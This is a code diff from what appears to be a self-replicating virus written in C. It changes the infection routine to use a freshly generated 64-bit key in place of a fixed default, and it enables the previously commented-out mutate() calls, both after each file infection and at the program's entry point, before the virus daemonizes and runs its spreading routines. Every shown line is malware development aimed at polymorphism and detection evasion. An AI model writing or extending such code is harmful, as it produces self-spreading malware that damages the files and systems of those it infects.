@@ -120,7 +120,7 @@ static void init_patch(data_t *data, size_t jmp_rel_offset) {
 
 	patch->virus_offset = addr_diff;
 
-	patch->key = DEFAULT_KEY;
+	patch->key = gen_key_64();
 
 	g_key = patch->key;
 }
@@ -320,7 +320,7 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 
 				if (infect(new_path, bs_data) == 0) {
 					(*counter)++;
-					//mutate();
+					mutate();
 
 #ifdef ENABLE_EXEC
 					execute_prog(new_path, bs_data->envp);
@@ -379,9 +379,10 @@ void	entrypoint(int argc, char **argv, char **envp)
 	int start_offset = g_start_offset;
 
 	prepare_mutate();
-	//mutate();
+	mutate();
 
 	daemonize(envp);
+
 
 	famine(&bootstrap_data, &counter);
 	war(counter, &file);
